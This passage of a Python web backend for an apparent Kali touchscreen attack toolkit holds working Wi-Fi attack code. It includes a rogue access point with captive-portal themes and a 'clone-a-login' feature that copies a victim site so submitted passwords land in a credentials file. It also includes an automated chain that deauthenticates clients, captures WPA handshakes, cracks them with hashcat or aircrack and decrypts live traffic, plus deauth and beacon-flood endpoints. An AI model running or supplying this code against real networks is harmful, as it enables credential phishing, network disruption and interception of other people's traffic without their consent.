        restore_managed(self.iface)

    def status(self):
        return {"running": self.running(), "iface": self.iface,
                "sent": self.sent, "ifaces": _wireless_ifaces(),
                "borrowed_from": PROBE_DIR + "/probes.json"}


class PortalKit:
    """Rogue AP front-end with selectable captive-portal pages. Picks a portal
    theme, then brings up the same hostapd/dnsmasq stack as the Rogue AP app;
    the portal child reads /tmp/rogue/theme.json and serves a cloned login page
    if one has been captured."""

    def start(self, iface, ssid, channel, psk, theme):
        theme = theme if theme in PORTAL_THEMES else "freewifi"
        try:
            os.makedirs(ROGUE_DIR, exist_ok=True)
        except OSError:
            pass
        try:
            with open(PORTAL_THEME_FILE, "w") as f:
                json.dump({"theme": theme}, f)
        except OSError:
            return False, "cannot write " + PORTAL_THEME_FILE
        ok, msg = ROGUE.start(iface, ssid, channel, psk)
        return ok, msg

    def stop(self):
        ROGUE.stop()

    def status(self):
        st = ROGUE.status()
        theme = "freewifi"
        try:
            with open(PORTAL_THEME_FILE) as f:
                theme = json.load(f).get("theme", "freewifi")
        except (OSError, ValueError):
            pass
        st["theme"] = theme
        st["themes"] = PORTAL_THEMES
        st["clone_present"] = os.path.isfile(CLONE_HTML) and os.path.getsize(CLONE_HTML) > 0
        return st


class CloneManager:
    """Clone-a-login: fetch a victim site's page and rewrite it so every form
    submits to our portal /login. The portal serves it for ANY host/path, so
    captive-portal checks show the clone and submissions land in creds.csv."""

    def __init__(self):
        self.busy = False

    def running(self):
        return self.busy

    def start(self, url):
        if not re.match(r"^https?://", str(url), re.I):
            return False, "URL must start with http(s)://"
        if self.busy:
            return False, "already fetching"
        self.busy = True
        threading.Thread(target=self._fetch, args=(str(url),), daemon=True).start()
        return True, "fetching " + str(url)

    def clear(self):
        for f in (CLONE_HTML, CLONE_META):
            try:
                os.remove(f)
            except OSError:
                pass
        return True, "clone removed"

    def _fetch(self, url):
        try:
            os.makedirs(ROGUE_DIR, exist_ok=True)
        except OSError:
            pass
        ua = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
              "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1")
        r = subprocess.run(
            ["curl", "-ksS", "-L", "--max-time", "25", "-A", ua,
             "-w", "\n__KTV__%{http_code}", url],
            capture_output=True, text=True)
        out = r.stdout or ""
        code = 0
        if "__KTV__" in out:
            out, _, c = out.rpartition("__KTV__")
            try:
                code = int(c.strip().split()[0])
            except (ValueError, IndexError):
                code = 0
        if code <= 0:
            self.busy = False
            self._meta({"ok": False, "url": url, "error":
                        (r.stderr or r.stdout or "fetch failed")[:200]})
            return
        html = rewrite_clone(out, url)
        try:
            with open(CLONE_HTML, "w", encoding="utf-8") as f:
                f.write(html)
        except OSError as e:
            self.busy = False
            self._meta({"ok": False, "url": url, "error": str(e)})
            return
        self.busy = False
        self._meta({"ok": True, "url": url, "http": code,
                    "size": len(html), "forms": html.count("<form"),
                    "time": int(time.time())})

    def _meta(self, data):
        try:
            with open(CLONE_META, "w") as f:
                json.dump(data, f)
        except OSError:
            pass

    def status(self):
        meta = {}
        try:
            with open(CLONE_META) as f:
                meta = json.load(f)
        except (OSError, ValueError):
            pass
        present = os.path.isfile(CLONE_HTML) and os.path.getsize(CLONE_HTML) > 0
        if present:
            meta.setdefault("ok", True)
        return {"present": present, "meta": meta, "busy": self.busy,
                "rogue_running": ROGUE.running(),
                "served_at": "any host/path → " + CLONE_HTML}


def rewrite_clone(html, url):
    """Neutralise a fetched page so it becomes our captive login screen."""
    html = re.sub(r"<form\b([^>]*)>",
                  lambda m: "<form method=\"POST\" action=\"/login\" " + clear_attrs(m.group(1)),
                  html, flags=re.I)
    # Off-site JS would break the captive page; keep inline scripts.
    html = re.sub(r"<script\b[^>]*\bsrc\s*=\s*[\"'][^\"']+[\"'][^>]*\s*>\s*</script>",
                  "", html, flags=re.I)
    return html


def clear_attrs(attrs):
    a = re.sub(r"\baction\s*=\s*(\"[^\"]*\"|'[^']*'|\S+)", "", attrs, flags=re.I)
    a = re.sub(r"\bmethod\s*=\s*(\"[^\"]*\"|'[^']*'|\S+)", "", a, flags=re.I)
    a = re.sub(r"\bonclick\s*=\s*(\"[^\"]*\"|'[^']*'|\S+)", "", a, flags=re.I)
    return a


class AutoPentest:
    """One-press chain on a target: monitor -> airodump capture -> deauth pokes
    until a handshake lands -> crack (hashcat, aircrack fallback) -> airdecap
    the live traffic. All on a worker thread."""

    def __init__(self):
        self.proc = None
        self.iface = None
        self.bssid = None
        self.essid = ""
        self.channel = None
        self.base = None
        self.phase = "idle"
        self.logs = []
        self.key = None
        self.decrypted = None
        self.handshake = False
        self.stop_flag = threading.Event()
        self.t0 = 0

    def running(self):
        return self.phase in ("monitor", "capture", "deauth", "handshake", "crack")

    def start(self, bssid, essid="", channel=None):
        if self.running():
            return False, "auto-pentest is already running"
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", str(bssid)):
            return False, "bad BSSID"
        iface = field_nic()
        if not iface:
            return False, "no wireless card"
        stop_field_tools(self)
        self.stop()
        try:
            os.makedirs(APENT_DIR, exist_ok=True)
            os.makedirs(APENT_POTS, exist_ok=True)
        except OSError:
            pass
        self.bssid = bssid.upper()
        self.essid = essid or ""
        self.channel = channel
        self.base = APENT_DIR + "/" + _safe(essid or bssid)
        self.phase = "monitor"
        self.key = None
        self.decrypted = None
        self.handshake = False
        self.logs = [(time.time(), "mission start " + self.bssid)]
        self.t0 = time.time()
        self.stop_flag.clear()
        threading.Thread(target=self._work, args=(iface,), daemon=True).start()
        return True, "auto-pentest on %s" % self.bssid

    def _log(self, msg):
        self.logs.append((time.time(), msg))
        if len(self.logs) > 300:
            del self.logs[:100]

    def _work(self, iface):
        if not set_monitor(iface):
            self.phase = "error"
            self._log("monitor mode failed")
            return
        self.iface = iface
        if self.channel:
            subprocess.run(["sudo", "-n", "iw", "dev", iface, "set", "channel",
                            str(self.channel)], stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
        self._log("monitor on " + iface)
        cmd = ["sudo", "-n", "airodump-ng"]
        if self.channel:
            cmd += ["-c", str(self.channel)]
        cmd += ["--bssid", self.bssid, "-w", self.base,
                "--output-format", "pcap", "--write-interval", "2", iface]
        try:
            logf = open(APENT_DIR + "/apent.log", "wb")
            self.proc = subprocess.Popen(cmd, stdout=logf, stderr=subprocess.STDOUT)
        except OSError as e:
            self.phase = "error"
            self._log("airodump missing: %s" % e)
            restore_managed(iface)
            return
        self.phase = "capture"
        self._log("capturing → " + os.path.basename(self.base) + ".cap")
        last_hs = 0
        last_size = -1
        cycle = 0
        while not self.stop_flag.is_set():
            time.sleep(3)
            cycle += 1
            caps = sorted(glob.glob(self.base + "*.cap"),
                          key=os.path.getmtime, reverse=True)
            cap = caps[0] if caps else None
            if cap and os.path.getsize(cap) != last_size:
                last_size = os.path.getsize(cap)
                hsh = APENT_DIR + "/" + os.path.basename(cap)[:-4] + ".22000"
                try:
                    r = subprocess.run(["hcxpcapngtool", "-o", hsh, cap],
                                       capture_output=True, text=True, timeout=60)
                    txt = (r.stdout or "") + "\n" + (r.stderr or "")
                    n = txt.count("4-WAY HANDSHAKE") + txt.count("Fourway") \
                        + txt.count("PMKID") + txt.count("PMKID-EAPOL")
                except (OSError, subprocess.TimeoutExpired):
                    n = 0
                if n > last_hs:
                    last_hs = n
                    self.handshake = True
                    self._log("handshake detected!")
                    self._crack(hsh, cap)
                    if self.key:
                        break
                    self.phase = "capture"
                    self._log("crack missed — watching for another handshake")
            if self.stop_flag.is_set():
                break
            if not self.handshake and (cycle % 2 == 1):
                subprocess.Popen(["sudo", "-n", "aireplay-ng", "-0", "3",
                                  "-a", self.bssid, iface],
                                 stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL)
                self.phase = "deauth"
                self._log("deauth poke #%d" % ((cycle + 1) // 2))
        if self.proc is not None:
            try:
                self.proc.terminate()
                self.proc.wait(4)
            except (subprocess.TimeoutExpired, OSError):
                try:
                    self.proc.kill()
                except OSError:
                    pass
            self.proc = None
        restore_managed(iface)
        if self.stop_flag.is_set():
            self.phase = "idle"
            self._log("stopped")
        elif self.phase != "cracked":
            self.phase = "done"
            self._log("end — no handshake captured")

    def _crack(self, hsh, cap):
        pot = APENT_POTS + "/" + os.path.basename(self.base) + ".pot"
        if not os.path.isfile(hsh) or os.path.getsize(hsh) == 0:
            self._log("no usable hash material")
            return
        self.phase = "crack"
        self._log("cracking × rockyou…")
        pw = ""
        if shutil.which("hashcat") and os.path.isfile(WORDLIST):
            try:
                p = subprocess.Popen(["sudo", "-n", "hashcat", "-m", "22000",
                                      "-a", "0", "-w", "2",
                                      "--potfile-path", pot, hsh, WORDLIST],
                                     stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL)
                try:
                    p.wait(300)
                except subprocess.TimeoutExpired:
                    try:
                        p.terminate()
                    except OSError:
                        pass
            except OSError:
                pass
            pw = self._read_pot(pot)
        if not pw and shutil.which("aircrack-ng") and os.path.isfile(WORDLIST):
            self._log("hashcat empty → aircrack-ng")
            try:
                p = subprocess.Popen(["sudo", "-n", "aircrack-ng", "-w", WORDLIST,
                                      "-b", self.bssid, cap],
                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                     text=True)
                try:
                    for line in p.stdout:
                        if "KEY FOUND" in line:
                            parts = line.split("[", 1)
                            pw = parts[1].split("]", 1)[0].strip() if len(parts) > 1 else ""
                            if pw:
                                break
                except Exception:
                    pass
            except OSError:
                pass
            if pw:
                try:
                    os.makedirs(APENT_POTS, exist_ok=True)
                    with open(pot, "w") as f:
                        f.write(self.bssid + ":" + pw + "\n")
                except OSError:
                    pass
        self.key = pw
        if pw:
            self._log("KEY FOUND: " + pw)
            self._airdecap(cap, pw)
            self.phase = "cracked"
        else:
            self._log("key not found in rockyou")

    @staticmethod
    def _read_pot(pot):
        if not os.path.isfile(pot):
            return ""
        try:
            with open(pot) as f:
                for line in f.read().splitlines():
                    if ":" in line:
                        return line.split(":", 1)[1].strip()
        except OSError:
            return ""
        return ""

    def _airdecap(self, cap, pw):
        out = APENT_DIR + "/decrypted.cap"
        txt = ""
        try:
            r = subprocess.run(["sudo", "-n", "airdecap-ng", "-b", self.bssid,
                                "-e", self.essid, "-p", pw, cap, "-o", out],
                               capture_output=True, text=True, timeout=120)
            txt = (r.stdout or "") + "\n" + (r.stderr or "")
        except (OSError, subprocess.TimeoutExpired):
            pass
        m = re.search(r"decrypted\s+WPA\s+.*?\b(\d+)\b", txt, re.I)
        self.decrypted = int(m.group(1)) if m else 0
        self._log("airdecap: %s WPA data packets decrypted" % self.decrypted)

    def stop(self):
        self.stop_flag.set()
        if self.proc is not None:
            try:
                self.proc.terminate()
                self.proc.wait(4)
            except (subprocess.TimeoutExpired, OSError):
                try:
                    self.proc.kill()
                except OSError:
                    pass
            self.proc = None
        restore_managed(self.iface)
        if self.running():
            self.phase = "idle"

    def status(self):
        return {"running": self.running(), "phase": self.phase,
                "iface": self.iface, "bssid": self.bssid,
                "essid": self.essid, "channel": self.channel,
                "handshake": self.handshake, "key": self.key,
                "decrypted": self.decrypted,
                "runtime": int(time.time() - self.t0) if self.t0 and self.running() else 0,
                "log": [{"t": int(t), "m": m2} for t, m2 in self.logs[-40:]],
                "ifaces": _wireless_ifaces()}


PROBE = ProbeTrackerManager()
DEAUTH = DeauthBlaster()
FLOOD = BeaconFlood()
PORTALKIT = PortalKit()
CLONE = CloneManager()
APENT = AutoPentest()


def stop_field_tools(keep):
    """Stop every other field/recon tool so the attack NIC is free for the one
    starting. `keep` is the manager that must survive."""
    for mgr in (WARDIRVE, RECON, HS, PROBE, DEAUTH, FLOOD, APENT, ROGUE):
        if mgr is keep:
            continue
        try:
            mgr.stop()
        except Exception:
            pass


def scan_aps():
    """Short monitor capture to enumerate nearby APs for the deauth blaster;
    hand the NIC back to managed mode when done."""
    iface = field_nic()
    if not iface:
        return []
    stop_field_tools(None)
    for f in glob.glob("/tmp/flash-*.csv"):
        try:
            os.remove(f)
        except OSError:
            pass
    if not set_monitor(iface):
        return []
    p = subprocess.Popen(["sudo", "-n", "airodump-ng", "--band", "abg",
                          "--write", "/tmp/flash", "--output-format", "csv",
                          iface], stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
    try:
        time.sleep(7)
    except KeyboardInterrupt:
        pass
    finally:
        try:
            p.terminate()
            p.wait(3)
        except (subprocess.TimeoutExpired, OSError):
            try:
                p.kill()
            except OSError:
                pass
    restore_managed(iface)
    cands = sorted(glob.glob("/tmp/flash-*.csv"))
    if not cands:
        return []
    return parse_recon_csv(cands[-1])["aps"]


# ---------------- OTA update ----------------
OTA_REPO = "https://github.com/darkLabz001/kali-touch-ui.git"
OTA_BRANCH = "main"
OTA_DIR = "/opt/kali-touch-ui"
OTA_LOG = "/tmp/ota.log"
APP_VERSION = "1.4.0"
_ota_busy = False
_ota_store_changed = False
_ota_lock = threading.Lock()


def _ota_log(msg):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
    with open(OTA_LOG, "a") as f:
        f.write(line + "\n")
    return line


def _ota_sh(cmd, timeout=60):
    cx = cmd
    if os.geteuid() != 0:
        cx = "sudo -n " + cx
    try:
        p = subprocess.run(cx, shell=True, capture_output=True, text=True, timeout=timeout)
        return p.returncode, (p.stdout + p.stderr).strip()
    except subprocess.TimeoutExpired:
        return 2, "timeout"


def ota_local_sha():
    rc, out = _ota_sh("git -C %s rev-parse HEAD" % OTA_DIR, 15)
    return out.strip() if rc == 0 else ""


def ota_remote_sha():
    rc, out = _ota_sh("git ls-remote %s refs/heads/%s" % (OTA_REPO, OTA_BRANCH), 30)
    if rc == 0:
        for line in out.splitlines():
            parts = line.split()
            if len(parts) == 2 and parts[1] == "refs/heads/%s" % OTA_BRANCH:
                return parts[0]
    return ""


def ota_status():
    global _ota_store_changed
    local = ota_local_sha()
    remote = ota_remote_sha()
    log = ""
    if os.path.exists(OTA_LOG):
        with open(OTA_LOG) as f:
            log = f.read()
    pct, stage = _ota_progress()
    return {
        "version": APP_VERSION,
        "method": "git" if local else "none",
        "installed": bool(local),
        "local": local,
        "local_short": local[:7],
        "remote": remote,
        "remote_short": remote[:7] if remote else "",
        "up_to_date": bool(remote) and remote == local,
        "store_changed": _ota_store_changed,
        "busy": _ota_busy,
        "pct": pct,
        "stage": stage or None,
        "log": log,
    }


def ota_update():
    global _ota_busy
    with _ota_lock:
        if _ota_busy:
            return {"ok": False, "msg": "an update is already running", "busy": True}
        _ota_busy = True
    threading.Thread(target=_ota_run, daemon=True).start()
    return {"ok": True, "msg": "update started"}


def _ota_progress():
    if not os.path.exists(OTA_LOG):
        return None, ""
    with open(OTA_LOG) as f:
        txt = f.read()
    pct = None
    for m in re.finditer(r"Receiving objects:\s+(\d+)%", txt):
        pct = int(m.group(1))
    stage = ""
    for marker, label in (
        ("syntax check", "verifying"),
        ("reset --hard", "applying"),
        ("Fetching", "fetching"),
        ("Receiving objects", "fetching"),
        ("update complete", "done"),
    ):
        if marker in txt:
            stage = label
            break
    return pct, stage


def _ota_run():
    """Run the fetch/apply/syntax/restart cycle (called from a thread)."""
    global _ota_busy
    try:
        with open(OTA_LOG, "w") as f:
            f.write("")
        _ota_log("checking for updates…")
        if not ota_local_sha():
            _ota_log("install not set up for OTA (not a git repo)")
            return {"ok": False, "msg": "OTA not configured on this install"}
        rc, out = _ota_sh("git -C %s fetch --progress origin" % OTA_DIR, 120)
        if rc != 0:
            _ota_log("fetch FAILED: " + out[-200:])
            return {"ok": False, "msg": "fetch failed: " + out[-80:]}
        old = ota_local_sha()
        remote = ota_remote_sha()
        if remote and remote == old:
            _ota_log("already up to date (%s)" % old[:7])
            return {"ok": True, "msg": "already up to date"}
        restart = False
        rc, out = _ota_sh("git -C %s reset --hard origin/%s" % (OTA_DIR, OTA_BRANCH), 90)
        if rc != 0:
            _ota_log("reset FAILED: " + out[-200:])
            return {"ok": False, "msg": "apply failed: " + out[-80:]}
        _ota_log("syntax check…")
        ok = _ota_sh("node --check %s/web/assets/app.js" % OTA_DIR, 20)
        ok2 = _ota_sh("python3 -m py_compile %s/backend/server.py" % OTA_DIR, 20)
        if ok[0] != 0 or ok2[0] != 0:
            _ota_log("check FAILED — rolling back to %s" % old[:7])
            _ota_sh("git -C %s reset --hard %s" % (OTA_DIR, old), 60)
            _ota_log("rolled back; update aborted")
            return {"ok": False, "msg": "post-update check failed; rolled back"}
        _ota_log("update complete (%s)" % remote[:7])
        restart = True
        return {"ok": True, "msg": "updated — restarting service"}
    except Exception as e:
        _ota_log("ERROR: %s" % e)
        return {"ok": False, "msg": str(e)}
    finally:
        _ota_busy = False
        if restart:
            # Relaunch the kiosk FIRST: the backend restart below reaps this
            # service's whole cgroup, so a pkill after it would never run and
            # Chromium would keep serving the pre-update page from memory.
            subprocess.Popen(
                "pkill -f 'chromium.*--app=http://127.0.0.1:8080' 2>/dev/null; "
                "sleep 2; sudo -n systemctl restart kali-touchui",
                shell=True,
            )


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, code, body=b"", ctype="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    @staticmethod
    def _apt_busy():
        global APT_PROC
        if APT_PROC is not None and APT_PROC.poll() is None:
            return True
        if subprocess.run(["pgrep", "-x", "apt-get"], stdout=subprocess.DEVNULL).returncode == 0:
            return True
        if subprocess.run(["pgrep", "-x", "dpkg"], stdout=subprocess.DEVNULL).returncode == 0:
            return True
        return False

    @staticmethod
    def _apt_tail():
        if os.path.isfile(APT_LOG):
            with open(APT_LOG, "rb") as f:
                return f.read(6000).decode("utf-8", "replace")
        return ""

    @staticmethod
    def _apt_start(chain):
        global APT_PROC
        if Handler._apt_busy():
            return False
        cmd = ("sudo -n /usr/bin/apt-get " + chain +
               " -o APT::Status-Fd=2 "
               "-o Dpkg::Options::=--force-confdef -o Dpkg::Options::=--force-confold")
        APT_PROC = subprocess.Popen(
            cmd, shell=True, stdout=open(APT_LOG, "w"), stderr=subprocess.STDOUT)
        return True

    @staticmethod
    def _apt_progress():
        txt = Handler._apt_tail()
        pct = None
        global APT_PROC
        if APT_PROC is not None and APT_PROC.poll() is None:
            for m in re.finditer(r"PM:PROGRESS:(\d+)", txt):
                pct = int(m.group(1))
        stage = ""
        if "PM:PROGRESS:0" in txt or "Get:" in txt or "Ign:" in txt or "Hit:" in txt:
            stage = "fetching"
        if "Preparing to unpack" in txt or "Unpacking" in txt:
            stage = "installing"
        if "Setting up " in txt or "Processing triggers" in txt:
            stage = "configuring"
        return pct, stage

    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/api/tools":
            tools = []
            for s, l, c, r in TOOLS:
                params = []
                if "{target}" in c:
                    params.append("target")
                if "{bssid}" in c:
                    params.append("bssid")
                if "{user}" in c:
                    params.append("user")
                if "{pass}" in c:
                    params.append("pass")
                if "{wordlist}" in c:
                    params.append("wordlist")
                if "{hashmode}" in c:
                    params.append("hashmode")
                bin_ = tool_bin(c)
                need = bool(bin_) and shutil.which(bin_) is None
                tools.append({
                    "section": s, "label": l, "root": r, "params": params,
                    "bin": bin_ if need else None,
                    "pkg": (tool_pkg(c) if need else None),
                    "need": need,
                })
            launchers = []
            for lid, gp, lab, ico, bin_, root, pkg in INTERACTIVE:
                path = shutil.which(bin_)
                launchers.append({
                    "id": lid, "group": gp, "label": lab, "icon": ico,
                    "bin": path, "exists": bool(path), "root": root, "pkg": pkg,
                })
            self._send(200, json.dumps(
                {"sections": SECTIONS, "tools": tools, "launchers": launchers}
            ).encode())
        elif path == "/api/wordlists":
            self._send(200, json.dumps({"wordlists": find_wordlists()}).encode())
        elif path == "/api/network":
            self._send(200, json.dumps({"info": get_network_info()}).encode())
        elif path == "/api/sysinfo":
            self._send(200, json.dumps(sysinfo()).encode())
        elif path == "/api/ota/status":
            self._send(200, json.dumps(ota_status()).encode())
        elif path == "/api/apt/status":
            pct, stage = self._apt_progress()
            self._send(200, json.dumps({
                "busy": self._apt_busy(), "log": self._apt_tail(),
                "pct": pct, "stage": stage,
            }).encode())
        elif path == "/api/wifi/scan":
            self._send(200, json.dumps(scan_wifi()).encode())
        elif path == "/api/term/status":
            self._send(200, json.dumps(
                {"running": not TERM.exited and TERM.pid is not None,
                 "pid": TERM.pid}
            ).encode())
        elif path == "/api/recon/state":
            self._send(200, json.dumps(RECON.state()).encode())
        elif path == "/api/recon/data":
            self._send(200, json.dumps(RECON.data()).encode())
        elif path == "/api/recon/log":
            self._send(200, json.dumps({"log": RECON.log_tail()}).encode())
        elif path == "/api/hs/state":
            self._send(200, json.dumps({
                "running": HS.running(),
                "iface": HS.iface,
                "target": HS.target,
                "channel": HS.channel,
                "captures": len(glob.glob(HS_DIR + "/*.cap")),
                "cracking": (HASHCAT is not None and HASHCAT.poll() is None),
                "autocrack": HS.autocrack_state(),
            }).encode())
        elif path == "/api/hs/captures":
            self._send(200, json.dumps({"captures": HS.captures()}).encode())
        elif path == "/api/hs/crack/status":
            base = self.query.get("base", [""])[0]
            if not base:
                self._send(400, b'{"ok":false}')
            else:
                self._send(200, json.dumps(crack_status(base)).encode())
        elif path == "/api/launch/status":
            if os.path.isfile(INSTALL_LOG):
                with open(INSTALL_LOG, "rb") as f:
                    tail = f.read(4000).decode("utf-8", "replace")
            else:
                tail = ""
            busy = subprocess.run(["pgrep", "-x", "apt-get"], stdout=subprocess.DEVNULL).returncode == 0
            self._send(200, json.dumps({"busy": busy, "log": tail}).encode())
        elif path == "/api/wardrive/status":
            st = WARDIRVE.status(self.headers.get("Host", ""))
            if not st["running"]:
                st["qr"] = None
            else:
                st["qr"] = WARDIRVE.qr_png_data(st["url"])
            self._send(200, json.dumps(st).encode())
        elif path == "/api/rogue/status":
            self._send(200, json.dumps(ROGUE.status()).encode())
        elif path == "/api/probe/status":
            self._send(200, json.dumps(PROBE.status()).encode())
        elif path == "/api/deauth/status":
            self._send(200, json.dumps(DEAUTH.status()).encode())
        elif path == "/api/flood/status":
            self._send(200, json.dumps(FLOOD.status()).encode())
        elif path == "/api/portal/status":
            self._send(200, json.dumps(PORTALKIT.status()).encode())
        elif path == "/api/clone/status":
            self._send(200, json.dumps(CLONE.status()).encode())
        elif path == "/api/apent/status":
            self._send(200, json.dumps(APENT.status()).encode())
        elif path == "/sse/term":
            self.handle_sse_term()
            return
        elif path.startswith("/sse"):
            self.handle_sse()
            return
        elif path == "/" or path == "/index.html":
            self.serve_file("index.html", "text/html")
        elif path.startswith("/media/"):
            name = path[len("/media/"):]
            if name.endswith(".mp4"):
                ctype = "video/mp4"
            elif name.endswith(".png"):
                ctype = "image/png"
            else:
                ctype = "application/octet-stream"
            self.serve_file(os.path.join("media", name), ctype)
        elif path.startswith("/assets/"):
            name = path[len("/assets/"):]
            if name.endswith(".css"):
                self.serve_file(os.path.join("assets", name), "text/css")
            elif name.endswith(".js"):
                self.serve_file(os.path.join("assets", name), "application/javascript")
            else:
                self._send(404, b"nf")
        else:
            self._send(404, b"not found")

    def do_POST(self):
        path = urlparse(self.path).path
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length) or b"{}")
        if path == "/api/run":
            try:
                cmd = build_cmd(body)
            except ValueError as e:
                self._send(400, json.dumps({"error": str(e)}).encode())
                return
            SSE.start(cmd)
            self._send(200, json.dumps({"ok": True}).encode())
        elif path == "/api/stop":
            SSE.stop()
            self._send(200, json.dumps({"ok": True}).encode())
        elif path == "/api/wifi/connect":
            res = connect_wifi(body.get("ssid", ""), body.get("password"))
            self._send(200 if res.get("ok") else 400, json.dumps(res).encode())
        elif path == "/api/reboot":
            self._send(200, json.dumps(reboot_device()).encode())
        elif path == "/api/shutdown":
            self._send(200, json.dumps(shutdown_device()).encode())
        elif path == "/api/ota/update":
            res = ota_update()
            self._send(200 if res.get("ok") else 409, json.dumps(res).encode())
        elif path == "/api/apt/upgrade":
            if not self._apt_start("update && /usr/bin/apt-get upgrade -y"):
                self._send(409, json.dumps({"error": "apt is busy"}).encode())
            else:
                self._send(200, json.dumps({"ok": True}).encode())
        elif path == "/api/install":
            pkg = body.get("pkg", "")
            if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9.+-]*", pkg):
                self._send(400, json.dumps({"error": "invalid package"}).encode())
            elif not self._apt_start("install -y --no-install-recommends " + pkg):
                self._send(409, json.dumps({"error": "apt is busy"}).encode())
            else:
                self._send(200, json.dumps({"ok": True, "pkg": pkg}).encode())
        elif path == "/api/term/start":
            TERM.start(init_cmd=body.get("cmd") or None, cwd=body.get("cwd") or None)
            self._send(200, json.dumps({"ok": True, "running": TERM.exited is False}).encode())
        elif path == "/api/recon/start":
            ok, msg = RECON.start(body.get("iface"))
            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
        elif path == "/api/recon/stop":
            RECON.stop()
            self._send(200, json.dumps({"ok": True}).encode())
        elif path == "/api/recon/deauth":
            ok = RECON.deauth(body.get("bssid", ""), body.get("client") or None, body.get("iface") or None)
            self._send(200 if ok else 400, json.dumps({"ok": ok}).encode())
        elif path == "/api/hs/start":
            ok, msg = HS.start(body.get("bssid", ""), body.get("essid", ""), body.get("channel"))
            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
        elif path == "/api/hs/stop":
            HS.stop()
            self._send(200, json.dumps({"ok": True}).encode())
        elif path == "/api/hs/deauth":
            ok = HS.deauth(body.get("bssid", ""), body.get("client") or None)
            self._send(200 if ok else 400, json.dumps({"ok": ok}).encode())
        elif path == "/api/hs/crack":
            ok, msg = start_crack(body.get("base", ""))
            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
        elif path == "/api/launch/install":
            tid = body.get("id", "")
            pkg = next((p for lid, gp, lab, ico, bin_, root, p in INTERACTIVE if lid == tid), None)
            if not pkg:
                self._send(404, json.dumps({"error": "unknown tool"}).encode())
                return
            if self._apt_busy():
                self._send(409, json.dumps({"error": "apt is busy"}).encode())
                return
            subprocess.Popen(
                f"apt-get install -y --no-install-recommends {pkg}",
                shell=True, stdout=open(INSTALL_LOG, "w"), stderr=subprocess.STDOUT,
            )
            self._send(200, json.dumps({"ok": True, "pkg": pkg}).encode())
        elif path == "/api/term/input":
            data = body.get("data", "")
            if isinstance(data, str):
                TERM.write(data)
            self._send(200, json.dumps({"ok": True}).encode())
        elif path == "/api/term/stop":
            TERM.stop()
            self._send(200, json.dumps({"ok": True}).encode())
        elif path == "/api/wardrive/start":
            ok, msg = WARDIRVE.start(
                (body.get("iface") or "").strip() or None, bool(body.get("ble")))
            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
        elif path == "/api/wardrive/stop":
            WARDIRVE.stop()
            self._send(200, json.dumps({"ok": True}).encode())
        elif path == "/api/rogue/start":
            ok, msg = ROGUE.start(
                (body.get("iface") or "").strip(),
                (body.get("ssid") or "Free-WiFi").strip(),
                body.get("channel") or 6,
                body.get("psk") or None)
            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
        elif path == "/api/rogue/stop":
            ROGUE.stop()
            self._send(200, json.dumps({"ok": True}).encode())
        elif path == "/api/probe/start":
            ok, msg = PROBE.start(body.get("iface"))
            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
        elif path == "/api/probe/stop":
            PROBE.stop()
            self._send(200, json.dumps({"ok": True}).encode())
        elif path == "/api/deauth/start":
            ok, msg = DEAUTH.start(
                mode=body.get("mode") or "target",
                bssid=body.get("bssid"),
                client=body.get("client") or None,
                channel=body.get("channel"))
            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
        elif path == "/api/deauth/stop":
            DEAUTH.stop()
            self._send(200, json.dumps({"ok": True}).encode())
        elif path == "/api/deauth/scan":
            aps = scan_aps()
            self._send(200, json.dumps({"aps": aps, "count": len(aps)}).encode())
        elif path == "/api/flood/start":
            ok, msg = FLOOD.start(
                ssids=body.get("ssids") or "",
                iface=body.get("iface"),
                channels=body.get("channels") or "1,6,11",
                hidden=bool(body.get("hidden")),
                from_probes=bool(body.get("from_probes") or body.get("borrow")))
            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
        elif path == "/api/flood/stop":
            FLOOD.stop()
            self._send(200, json.dumps({"ok": True}).encode())
        elif path == "/api/portal/start":
            ok, msg = PORTALKIT.start(
                (body.get("iface") or "").strip(),
                (body.get("ssid") or "Free-WiFi").strip(),
                body.get("channel") or 6,
                body.get("psk") or None,
                (body.get("theme") or "freewifi").strip())
            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
        elif path == "/api/portal/stop":
            PORTALKIT.stop()
            self._send(200, json.dumps({"ok": True}).encode())
        elif path == "/api/clone/start":
            ok, msg = CLONE.start(body.get("url", ""))
            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
        elif path == "/api/clone/clear":
            ok, msg = CLONE.clear()
            self._send(200, json.dumps({"ok": ok, "msg": msg}).encode())
        elif path == "/api/apent/start":
            ok, msg = APENT.start(
                body.get("bssid", ""),
                body.get("essid", ""),
                body.get("channel"))
            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
        elif path == "/api/apent/stop":
            APENT.stop()
            self._send(200, json.dumps({"ok": True}).encode())
        else:
            self._send(404, b"nf")

    def handle_sse(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-cache")
        self.send_header("Connection", "keep-alive")
        self.end_headers()
        try:
            while True:
                lines = SSE.poll()
